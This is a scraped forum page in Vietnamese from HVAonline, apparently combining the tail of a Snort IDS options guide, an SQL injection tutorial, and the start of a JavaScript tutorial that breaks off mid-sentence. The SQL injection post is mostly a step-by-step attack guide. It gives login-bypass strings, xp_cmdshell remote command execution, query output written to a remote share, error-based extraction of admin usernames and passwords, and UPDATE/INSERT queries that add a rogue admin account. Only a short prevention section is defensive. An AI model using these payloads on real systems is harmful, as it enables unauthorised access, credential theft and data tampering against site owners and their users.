biết ví dụ home-net, dn-server….<br/><br/> -t chroot<br/><br/> Thay đổi thư mục root của Snort là chroot sau khi khởi động. đường dẫn cho logfiles và các files alert sẽ liên quan trực tiếp đến thư mục mới này<br/><br/> -T<br/><br/> Khởi động Snort ơ chế độ selt-test. Hữu ích khi debug Snort trước khi chạy ở chế độ deamon<br/><br/> -u user<br/><br/> Thay đổi ID và UID của user giống như –g phía trước<br/><br/> -U<br/><br/> Áp đặt thời gian vào log files. Dùng trong các truờng hợp capture từ nhiều sources trên 1 syslog server và các sensor gửi thông qua WAN<br/><br/> -v<br/><br/> In toàn bộ packet trên console. Cẩn thận khi dùng, nó làm cho Snort chậm đi khi drop packet<br/><br/> -V<br/><br/> Hiển thị Version của Snort<br/> -x<br/><br/> Hiển thị các packet “thô” cần dùng khi xem các ethernet headers và trailers<br/><br/> -y<br/><br/> Bao gồm năm trong log files<br/><br/> -z<br/><br/> Bật chức năng stream4<br/><br/> -?<br/><br/> Danh sách các option và thoát<br/><br/><br/> 2.3. Các chế độ hoạt động của Snort<br/><br/> Trong phần này, em sẽ trình bày tại sao cần Snort trong khi nó có vẻ giống các phần mềm khác như tcpdump cũng sniff packet và có thể đọc từ định dạng của libpcap. Sau đây là những lý do chứng tỏ Snort có nhiều điểm tốt trong giải pháp sniffing và phát hiện xâm nhập.<br/>  Mô tả sâu sắc về các dòng dữ liệu<br/>  Linh hoạt hơn tcpdump về khả năng đọc và output<br/>  Có thể dễ dàng chỉnh sửa , hiển thị nhiều trường đa dạng trong các headers<br/>  Viết các rules liên quan dễ dàng dễ hiểu và dễ chỉnh sửa<br/>  Có thể report trên các mạng wireless riêng biệt bằng cách sử dụng những patches đặc biệt<br/><br/> Nhìn tổng quan về cơ chế hoạt động của snort<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-67588-1136455684_thumb.jpg' border="0" /></div><br/><br/><br/> channhua - HVA</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/163.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/163/560.html#560,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Mục lục:<br/><br/> <font color='violet'>1. SQL Injection là gì?<br/> 2. Tìm kiếm mục tiêu<br/> 3. K iểm tra chỗ yếu của trang web<br/> 4. Tại sao ' or 1=1-- có thể bypass login?<br/> 5. Thi hành lệnh từ xa bằng SQL Injection<br/> 6.Nhận output của SQL query<br/> 7. Nhận data qua 'database using ODBC error message'<br/> 8. Xác định tên của các column trong table<br/> 9. Thu thập các dữ liệu quan trọng<br/> 10. Nhận các numeric string<br/> 11. Update/insert data vào CSDL<br/> 12. Ngăn chặn SQL Injection<br/> 13. Tài liệu thao khảo</font><br/><br/><br/> <font color='violet'>1) SQL Injection là gì?</font><br/><br/> SQL Injection là một trong những kiểu hack web đang dần trở nên phổ biến hiện nay. Bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username và password, remote execution, dump data và lấy root của SQL server. Công cụ dùng để tấn công là một trình duyệt web bất kì, chẳng hạn như Internet Explorer, Netscape, Lynx, ...<br/><br/> <font color='violet'>2) Tìm kiếm mục tiêu</font><br/><br/> Bạn có thể search các trang web cho phép submit data ở bất kì một search-engine nào trên mạng, chẳng hạn như các trang login, search, feedback, ...<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span><br/><br/> Một số trang web chuyển tham số qua các field ẩn, bạn phải xem mã HTML mới thấy rõ.<br/><br/> &lt;FORM action=Search/search.asp method=post&gt;<br/> &lt;input type=hidden name=A value=C&gt;<br/> &lt;/FORM&gt;<br/> <font color='violet'><br/> 3) Kiểm tra chỗ yếu của trang web</font><br/><br/> Thử submit các field username, password hoặc field id, .. bằng hi' or 1=1--<br/><br/> - Login: hi' or 1=1--<br/> - Pass: hi' or 1=1--<br/> -<span class="link"> http://vịtcon/index.asp?id=hi'</span> or 1=1--<br/><br/> Nếu site chuyển tham số qua field ẩn, bạn hãy download source HTML, lưu trên đĩa cứng và thay đổi lại URL cho phù hợp. Ví dụ:<br/><br/> &lt;FORM action=http://vịtcon/Search/search.asp method=post&gt;<br/> &lt;input type=hidden name=A value="hi' or 1=1--"&gt;<br/> &lt;/FORM&gt;<br/><br/> Nếu thành công, bạn có thể login vào mà không cần phải biết username và password<br/><br/> <font color='violet'>4) Tại sao ' or 1=1-- có thể bypass login?</font><br/><br/> Giả sử như có một trang asp link đến một asp trang khác với URL như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?category=food</span><br/><br/> Trong URL trên, biến 'category' được gán giá trị là 'food'. Mã asp của trang này có thể như sau (đây chỉ là ví dụ thôi):<br/><br/> v_cat = request("category")<br/> sqlstr="SELECT * FROM product WHERE PCategory='" & v_cat & "'"<br/> set rs=conn.execute(sqlstr)<br/><br/> v_cat sẽ chứa giá trị của biến request.category, 'food' và câu lệnh SQL tiếp theo sẽ là:<br/><br/> SELECT * FROM product WHERE PCategory='food'<br/><br/> Dòng query trên sẽ trả về một tập resultset chứa một hoặc nhiều dòng phù hợp với điều kiện WHERE PCategory='food'<br/><br/> Nếu bạn thay đổi URL trên thành<span class="link"> http://vịtcon/index.asp?category=food'</span> or 1=1-- , biến v_cat sẽ chứa giá trị "food' or 1=1-- " và dòng lệnh SQL query sẽ là:<br/><br/> SELECT * FROM product WHERE PCategory='food' or 1=1--'<br/><br/> Dòng query trên sẽ select mọi thứ trong table product bất chấp PCategory có bằng 'food' hay không. Hai dấu gạch ngang "--" chỉ cho MS SQL server biết đã hết dòng query, mọi thứ còn lại sau "--" sẽ bị bỏ qua. Đối với MySQL, bạn hãy thay "--" thành "#"<br/><br/> Bạn cũng có thể thử cách khác bằng cách submit ' or 'a'='a. Dòng SQL query bây giờ sẽ là:<br/><br/> SELECT * FROM product WHERE PCategory='food' or 'a'='a'<br/><br/> Một số data khác mà bạn cũng nên submit để biết xem trang web có gặp lỗi hay không:<br/><br/> ' or 1=1--<br/> " or 1=1--<br/> or 1=1--<br/> ' or 'a'='a<br/> " or "a"="a<br/> ') or ('a'='a<br/><br/> <font color='violet'>5) Thi hành lệnh từ xa bằng SQL Injection</font><br/><br/> Nếu cài đặt với chế độ default, MS SQL Server sẽ chạy ở mức SYSTEM, tương đương với mức truy cập Administrator trên Windows. Bạn có thể dùng master..xp_cmdshell để thi hành lệnh từ xa:<br/><br/> '; exec master..xp_cmdshell 'ping 10.10.1.2'--<br/><br/> Hãy thử dùng dấu nháy đôi (") nếu dấu nháy đơn (') không làm việc.<br/><br/> Dấu chấm phẩy ( ; ) sẽ kết thúc dòng SQL query hiện tại và cho phép bạn thi hành một SQL command mới. Để kiểm tra xem lệnh trên có được thi hành hay không, bạn có thể listen các ICMP packet from 10.10.1.2 bằng tcpdump như sau:<br/><br/> #tcpdump icmp<br/><br/> Nếu nhận được ping request từ 10.10.1.2 nghĩa là lệnh đã được thi hành.<br/><br/> <font color='violet'>6) Nhận output của SQL query</font><br/><br/> Bạn có thể dùng sp_makewebtask để ghi các output của SQL query ra một file HTML<br/><br/> '; EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"<br/><br/> folder "share" phải được share cho Everyone trước.<br/> <font color='violet'><br/> 7) Nhận data qua 'database using ODBC error message'</font><br/><br/> Các error message của MS SQL Server thường đưa cho bạn những thông tin quan trọng. Lấy ví dụ ở trên<span class="link"> http://vịtcon/index.asp?id=10,</span> bây giờ chúng ta thử hợp nhất integer '10' với một string khác lấy từ CSDL:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--<br/><br/> System table INFORMATION_SCHEMA.TABLES chứa thông tin về tất cả các table có trên server. Field TABLE_NAME chứa tên của mỗi table trong CSDL. Chúng ta chọn nó bởi vì chúng ta biết rằng nó luôn tồn tại. Query của chúng ta là:<br/><br/> SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-<br/><br/> Dòng query này sẽ trả về tên của table đầu tiên trong CSDL<br/><br/> Khi chúng ta UNION string này với số integer 10, MS SQL Server sẽ cố thử chuyển một string (nvarchar) thành một số integer. Điều này sẽ gặp lỗi nếu như không chuyển được nvarchar sang int, server sẽ hiện thông báo lỗi sau:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'table1' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Thông báo lỗi trên cho biết giá trị muốn chuyển sang integer nhưng không được, "table1". Đây cũng chính là tên của table đầu tiên trong CSDL mà chúng ta đang muốn có.<br/><br/> Để lấy tên của tên của table tiếp theo, bạn có thể dùng query sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--<br/><br/> Bạn cũng có thể search data bằng từ khóa LIKE:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25login%25'--<br/><br/> Output:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'admin_login' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Mẫu so sánh '%25login%25' sẽ tương đương với %login% trong SQL Server. Như bạn thấy trong error message trên, chúng ta có thể xác định được tên của một table quan trọng là "admin_login".<br/><br/> <font color='violet'>8 ) Xác định tên của các column trong table</font><br/><br/> Table INFORMATION_SCHEMA.COLUMNS chứa tên của tất cả các column trong table. Bạn có thể khai thác như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--<br/><br/> Output:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_id' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Như vậy tên của column đầu tiên là "login_id". Để lấy tên của các column tiếp theo, bạn có thể dùng mệnh đề logic NOT IN () như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id')--<br/><br/> Output:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_name' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Làm tương tự như trên, bạn có thể lấy được tên của các column còn lại như "password", "details". Bạn lấy tên của các column này qua error message error sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id','login_name','password',details')--<br/><br/> Output:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e14'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]ORDER BY items must appear in the select list if the statement contains a UNION operator.<br/> /index.asp, line 5<br/><br/> <font color='violet'>9) Thu thập các dữ liệu quan trọng</font><br/><br/> Chúng ta đã xác định được các tên của các table và column quan trọng. Chúng ta sẽ thu thập các thông tin quan trọng từ các table và column này.<br/><br/> Bạn có thể lấy login_name đầu tiên trong table "admin_login" như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 login_name FROM admin_login--<br/><br/> Output:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'neo' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Bạn dễ dàng nhận ra được admin user đầu tiên có login_name là "neo". Hãy thử lấy password của "neo" như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--<br/><br/> Output:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'm4trix' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Bây giờ bạn có thể login vào với username là "neo" và password là "m4trix".<br/><br/> <font color='violet'>10) Nhận các numeric string</font><br/><br/> Có một hạn chế nhỏ đối với phương pháp trên. Chúng ta không thể nhận được các error message nếu server có thể chuyển text đúng ở dạng số (text chỉ chứa các kí tự số từ 0 đến 9). Giả sử như password của "trinity" là "31173".<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--<br/><br/> Bạn chỉ nhận được thông báo lỗi "Page Not Found". Lí do bởi vì server có thể chuyển passoword "31173" sang dạng số trước khi UNION với integer 10. Để giải quyết vấn đề này, chúng ta có thể thêm một vài kí tự alphabet vào numeric string này để làm thất bại sự chuyển đổi từ text sang số của server. Dòng query mới như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 convert(int, password%2b'%20morpheus') FROM admin_login where login_name='trinity'--<br/><br/> Chúng ta dùng dấu cộng (+) để nối thêm text vào password (ASSCII code của '+' là 0x2b). Chúng ta thêm chuỗi '(space)morpheus' vào cuối password để tạo ra một string mới không phải numeric string là '31173 morpheus'. Khi hàm convert() được gọi để chuyển '31173 morpheus' sang integer, SQL server sẽ phát lỗi ODBC error message sau:<br/><br/> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br/> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value '31173 morpheus' to a column of data type int.<br/> /index.asp, line 5<br/><br/> Bây giờ bạn cũng có thể login vào với username 'trinity' và password là '31173'<br/> <font color='violet'><br/> 11) Update/insert data vào CSDL</font><br/><br/> Khi bạn đã có tên của tất cả các column trong table, bạn có thể UPDATE hoặc INSERT một record mới vào table này.<br/><br/> Để thay đổi password của "neo", bạn có thể làm như sau:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10;</span> UPDATE 'admin_login' SET 'password' = 'newpas5' WHERE login_name='neo'--<br/><br/> Hoặc nếu bạn muốn chèn một record mới vào table:<br/><br/><span class="link"> http://vịtcon/index.asp?id=10;</span> INSERT INTO 'admin_login' ('login_id', 'login_name', 'password', 'details') VALUES (666,'neo2','newpas5','NA')--<br/><br/> Bây giờ bạn có thể login vào với username "neo2" và password là "newpas5"<br/><br/> <font color='violet'>12) Ngăn chặn SQL Injection</font><br/><br/> Hãy loại bỏ các kí tự meta như '"/\; và các kí tự extend như NULL, CR, LF, ... trong các string nhận được từ:<br/><br/> - input do người dùng đệ trình<br/> - các tham số từ URL<br/> - các giá trị từ cookie<br/><br/> Đối với các giá trị numeric, hãy chuyển nó sang integer trước khi query SQL, hoặc dùng ISNUMERIC để chắc chắn nó là một số integer.<br/><br/> Thay đổi "Startup and run SQL Server" dùng mức low privilege user trong tab SQL Server Security.<br/><br/> Xóa các stored procedure mà bạn không dùng như:<br/><br/> master..Xp_cmdshell, xp_startmail, xp_sendmail, sp_makewebtask<br/><br/> <font color='violet'>13) Tài liệu thao khảo</font><br/><br/> - How I hacked PacketStorm (Rain Forest Puppy)<span class="link"> http://www.wiretrip.net/rfp/p/doc.asp?id=42&iface=6</span><br/> - Great article on gathering information from ODBC error messages<span class="link"> http://www.blackhat.com/presentations/win-usa-01/Litchfield/BHWin01Litchfield.doc</span><br/> - A good summary of SQL Injection on various SQL Server on<span class="link"> http://www.owasp.org/asac/input_validation/sql.shtml</span><br/> - Senseport's article on reading SQL Injection<span class="link"> http://www.sensepost.com/misc/SQLinsertion.htm</span><br/> - Khác:<span class="link"> http://www.digitaloffense.net/wargames01/IOWargames.ppt,</span><span class="link"> http://www.wiretrip.net/rfp/p/doc.asp?id=7&iface=6,</span><span class="link"> http://www.wiretrip.net/rfp/p/doc.asp?id=60&iface=6,</span><span class="link"> http://www.spidynamics.com/whitepapers/WhitepaperSQLInjection.pdf</span><br/><br/> * Bài viết này được dịch và sửa đổi từ bài viết "SQL Injection Walkthrough" của xfocus.net. Hy vọng bạn có thể nắm bắt được các vấn đề mà mình đã trình bày ở trên.<br/><br/> - Vicki - </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/162.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/162/556.html#556,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><font color='violet'>HTML</font><br/><br/> HTML là thứ dễ học nhất bạn từng thấy. Và vì nó quá đơn giản nên tôi không đi sâu nữa và sẽ bỏ qua nó, hơn nữa đã có quá nhiều forum và portal đã có tutorial về HTML bằng tiếng Việt nên tôi nghĩ việc làm lại tut HTML là một việc thừa.<br/><br/> <font color='violet'>JavaScript</font><br/><br/> Cũng tương tự như HTML, đã có quá nhiều site cho download source Javascript cùng với những hiệu ứng của nó, nhưng công việc của tôi không phải là giới thiệu các source code mà là giới thiệu cho bạn hiểu và tự bạn sẽ biết cách viết các code đó. Tôi sẽ bỏ qua các phần không quan trọng như: Are Java and JavaScript the same? What can a JavaScript Do?.....<br/><br/> Chúng ta bắt đầu nhá:<br/><br/> Làm thế nào để viết một đoạn Javascript trong một trang HTML?<br/><br/> &lt;html&gt;<br/> &lt;body&gt;<br/> &lt;script type="text/javascript"&gt;<br/> document.write("Hello World!")<br/> &lt;/script&gt;<br/> &lt;/body&gt;<br/> &lt;/html&gt;<br/><br/><br/> Khi bạn chạy trang HTML có code như trên, Trình duyệt sẽ hiển thị dòng<br/><br/> Hello World!<br/><br/> lên màn hình.<br/><br/> Để bắt đầu một đoạn Javascript, chúng ta dùng cặp thẻ &lt;script type="text/javascript"&gt; và &lt;/script&gt; hoặc &lt;script language=javascript&gt; và &lt;/script&gt;<br/><br/> Để viết cái gì đó lên màn hình bạn dùng lệnh sau: document.write<br/><br/> vd: &lt;script type="text/javascript"&gt;document.write("Hello World!") &lt;/script&gt;<br/><br/> Không giống như các ngôn ngữ lập trình khác như C++ hay Java, Javascript không bắt buộc bạn phải đặt dấu chấm phẩy (<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"> ở cuối mỗi câu lệnh trừ phi bạn đặt nhiều câu lệnh trên một dòng.<br/><br/> Bạn cũng có thể đặt các câu lệnh trong các thẻ chú giải (comment) như sau:<br/><br/> &lt;script type="text/javascript"&gt;<br/> &lt;!--<br/> some statements<br/> //--&gt;<br/> &lt;/script&gt;<br/><br/> <font color='darkblue'><br/> Chúng ta sẽ đặt các đoạn mã Javascript ở đâu?</font><br/><br/> Các bạn cần biết rằng, các Script sẽ thực thi ngay khi trang đó được load vào trong trình duyệt, nhưng đó chưa chắc đã là điều lúc nào chúng ta cũng muốn. Thỉnh thoảng chúng ta chỉ muốn Script đó thực thi khi mà user thực hiện một động tác nào đó chẳng hạn.<br/><br/> Javascript đặt trên head section: Các script này sẽ chỉ thực thi khi chúng ta gọi nó hay khi có một sự kiện nào đó xẩy ra như khi bạn click chuột, hay bấm vào một button nào đó. Khi bạn đặt các script trên head section, bạn phải chắc chắn là đoạn script đó đã được load xong trước khi user dùng nó.<br/><br/> vd:<br/><br/> &lt;html&gt;<br/> &lt;head&gt;<br/> &lt;script type="text/javascript"&gt;<br/> some statements<br/> &lt;/script&gt;<br/> &lt;/head&gt;<br/> &lt;body&gt;<br/> content<br/> &lt;/body&gt;<br/> &lt;/html&gt;<br/><br/><br/> Javascript đặt trong body section: Khi bạn đặt các script vào trong body section, nó sẽ sinh ra nội dung của trang đó.<br/><br/> vd:<br/> &lt;html&gt;<br/> &lt;head&gt;<br/> &lt;/head&gt;<br/> &lt;body&gt;<br/> &lt;script type="text/javascript"&gt;<br/> some statements<br/> &lt;/script&gt;<br/> &lt;/body&gt;<br/> &lt;/html&gt;<br/><br/><br/> Javascript đặt cả trên head và body section: Bạn có thể để không giới hạn các script trong tài liệu của bạn, vì thế bạn có thể đặt các script cả trên head lẫn body section.<br/><br/> vd:<br/><br/> &lt;html&gt;<br/> &lt;head&gt;<br/> &lt;script type="text/javascript"&gt;<br/> some statements<br/> &lt;/script&gt;<br/> &lt;/head&gt;<br/> &lt;body&gt;<br/> &lt;script type="text/javascript"&gt;<br/> some statements<br/> &lt;/script&gt;<br/> &lt;/body&gt;<br/><br/><br/> <font color='darkblue'>Làm thế nào để chạy Javascript như là phần mở rộng?</font><br/><br/> Thỉnh thoảng, bạn muốn chạy một đoạn script cho nhiều trang mà không muốn viết lại từng dòng lệnh cho các trang đó. Có một cách đơn giả là bạn viết các đoạn script ra một file mở rộng và save nó thành đuôi *.js<br/><br/> Chẳng hạn như bạn viết:<br/><br/> document.write("This script is external")<br/><br/><br/> save nó lại thành xxx.js (Chú ý rằng trong flie js này, bạn viết trực tiếp các script luôn mà không cần phải viết cặp thẻ &lt;script&gt; và &lt;/script&gt<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Bây giờ bạn có thể tái sử dụng các script đó khi gọi nó bằng thuộc tính "src"<br/><br/> &lt;html&gt;<br/> &lt;head&gt;<br/> &lt;/head&gt;<br/> &lt;body&gt;<br/> &lt;script src="xxx.js"&gt;&lt;/script&gt;<br/> &lt;/body&gt;<br/> &lt;/html&gt;<br/><br/><br/> Bạn phải chú ý đến đường dẫn tới file js này cẩn thận.<br/><br/> <font color='darkblue'>Các biến trong Javascript.</font><br/><br/> Một biến trong Javascript là một vại nước gạo hổ lốn <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> (container) cho các thông tin mà bạn muốn chứa vào. Thực sự là vậy, trong Javascript một biến có thể chứa được rất nhiều kiểu, ví dụ như integer, char, string......<br/><br/> Bạn có thể tạo ra một biến với câu lệnh var: var strname = some value<br/><br/> hoặc gán trực tiếp giá trị cho biến khi khai báo luôn: var strname = "Hege"<br/><br/> hoặc khi bạn chẳng muốn viết từ khóa var thì bạn cũng có thể tương luôn: strname = "Hege". Nó sẽ tự hiểu strname là biến, và "Hege" là giá trị.<br/><br/> Vòng đời của các biến:<br/><br/> Khi bạn khai báo biến trong một hàm thì biến đó chỉ có thể được dùng cho hàm đó và nó sẽ bị "triệt tiêu" <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> (destroy) khi bạn thoát ra khỏi hàm. Biến này được gọi là biến cục bộ, và vì tính chất của biến cục bộ như vậy nên bạn hoàn có thể dùng các biến cục bộ trùng tên nhưng khác hàm.<br/><br/> Nếu bạn khai báo một biến ngoài hàm thì tất cả các hàm đều có thể truy xuất biến đó. Vòng đời của biến này được tạo ra khi nó được khai báo và sẽ kết thúc khi user đóng trang đó lại.<br/><br/> <font color='darkblue'>Các toán tử: </font><br/><br/> Các toán tử trong Javascript hoàn toàn giống các toán tử trong các ngôn ngữ lập trình khác:<br/><br/> + - * / % ++ --<br/><br/> = += -= *= /= %=<br/><br/> == != &gt; &lt; &gt;= &lt;=<br/><br/> && || !<br/><br/> Để cộng các chuỗi, bạn có thể dùng toán tử "+"<br/><br/> vd:<br/><br/> txt1="What a very"<br/> txt2="nice day!"<br/> txt3=txt1+txt2<br/> Biến txt3 bây giờ sẽ chứa "What a verynice day!".<br/><br/> Để thêm khoảng trắng vào giữa hai biến, ta có hai cách:<br/><br/> txt1="What a very"<br/> txt2="nice day!"<br/> txt3=txt1+" "+txt2<br/> or<br/> txt1="What a very "<br/> txt2="nice day!"<br/> txt3=txt1+txt2<br/> Và biến txt3 bây giờ sẽ chứa "What a very nice day!"<br/><br/> <font color='darkblue'>Hàm</font><br/><br/> Một hàm thường là một vài đoạng code sẽ được thực thi bởi một sự kiện nào đó xẩy ra và gọi ngay chính hàm đó. Một hàm là một tập các câu lệnh, bạn có thể dùng lại hàm trong cùng một script hoặc trong cả các tài liệu khác. Bạn phải định nghĩa hàm khi bắt đầu của một file (in the head section) để gọi chúng sau này. Bây giờ chúng ta sẽ cùng học về hộp thoại cảnh báo (alert box):<br/><br/> Đây là cách mà Javascript dùng để cảnh báo tới user:<br/><br/> alert("This is a message")<br/><br/><br/> Làm sao để định nghĩa một hàm:<br/><br/> Để tạo một hàm bạn hãy định nghĩa tên cho nó, một vài đối số ("arguments"), và một vài câu lệnh:<br/><br/> function myfunction(argument1,argument2,etc)<br/> {<br/> some statements<br/> }<br/><br/><br/> Một hàm không có đối số thì vẫn phải có 2 dấu ngoặc đơn: ( và ) :<br/><br/> function myfunction()<br/> {<br/> some statements<br/> }<br/><br/> Các đối số là các biến được sử dụng trong hàm. Giá trị của các biến này là các giá trị được đưa vào khi hàm được gọi. Bằng cách đặt hàm lên trên head section, bạn đã chắc chắn việc tất cả các code trong hàm đã được load trước khi hàm được gọi.<br/><br/> Một vài hàm sẽ trả ngay về giá trị khi được gọi:<br/><br/> function result(a,b)<br/> {<br/> c=a+b<br/> return c<br/> }<br/><br/><br/> <font color='blue'>Làm thế nào để gọi hàm?</font><br/><br/> Một hàm chưa được thực thi khi nó chưa được gọi. Bạn có thể gọi được một hàm chứa các đối số:<br/><br/> myfunction(argument1,argument2,etc)<br/><br/><br/><br/><br/> hoặc không chứa đối số:<br/><br/> myfunction()<br/><br/><br/> Câu lệnh trả về:<br/><br/> Muốn hàm trả về kết quả, bạn phải dùng câu lệnh "return". Câu lệnh này sẽ chỉ rõ giá trị nào sẽ trả về nơi mà hàm được gọi. Giả sử bạn có một hàm trả về giá trị tổng của hai số:<br/><br/> function total(a,b)<br/> {<br/> result=a+b<br/> return result<br/> }<br/><br/><br/> Khi bạn gọi hàm trên, bạn phải truyền vào 2 đối số cho nó:<br/> sum=total(2,3)<br/><br/> Các câu lệnh điều kiện:<br/><br/> Trong khi viết JavaScript, có lúc bạn muốn thực hiện các hành động khác nhau cho những trường hợp sự kiện xẩy ra khác nhau. Bạn có thể sử dụng các câu lệnh điều kiện để làm điều này.<br/><br/> Trong JavaScript có ba kiểu câu lệnh điều kiện<br/><br/> Câu lệnh If và If....Else:<br/><br/> sử dụng câu lệnh này nếu bạn muốn thực thi code khi điều kiện là đúng. Cú pháp:<br/><br/> if (condition)<br/> {<br/> code to be executed if condition is true<br/> }<br/> Vd:<br/><br/> &lt;script type="text/javascript"&gt;<br/> //If the time on your browser is less than 10,<br/> //you will get a "Good morning" greeting.<br/><br/> var d=new Date()<br/> var time=d.getHours()<br/> //You can put (time&gt;10) if Brower don't display "Good morning" message.<br/> if (time&lt;10)<br/> {<br/> document.write("&lt;b&gt;Good morning&lt;/b&gt;")<br/> }<br/> &lt;/script&gt;<br/> Chú ý rằng không có else trong ví dụ trên, nhưng nếu bạn muốn thực thi đoạn code này khi điều kiện đúng và đoạn code kia khi điều kiện sai thì JavaScript cung cấp cho bạn cú pháp sau:<br/><br/> if (condition)<br/> {<br/> code to be executed if condition is true<br/> }<br/> else<br/> {<br/> code to be executed if condition is false<br/> }<br/> Vd:<br/><br/> &lt;script type="text/javascript"&gt;<br/> //If the time on your browser is less than 10,<br/> //you will get a "Good morning" greeting.<br/> //Otherwise you will get a "Good day" greeting.<br/> var d = new Date()<br/> var time = d.getHours()<br/><br/> if (time &lt; 10)<br/> {<br/> document.write("Good morning!")<br/> }<br/> else<br/> {<br/> document.write("Good day!")<br/> }<br/> &lt;/script&gt;<br/><br/> <font color='darkblue'>Câu lệnh Switch</font><br/><br/> Câu lệnh Switch cho phép bạn chọn lựa các phần của mã lệnh tùy theo giá trị của một biến hoặc một biểu thức. Cú pháp:<br/><br/> switch (biểu thức)<br/> {<br/> case label1:<br/> Đoạn mã thực thi nếu biểu thức = label1<br/> break<br/> case label2:<br/> Đoạn mã thực thi nếu biểu thức = label2<br/> break<br/> default:<br/> Đoạn mã thực thi khi biểu thức không bằng cả label1 và label2.<br/> }<br/> Đây là cách nó làm việc: JavaScript sẽ định ra giá trị của 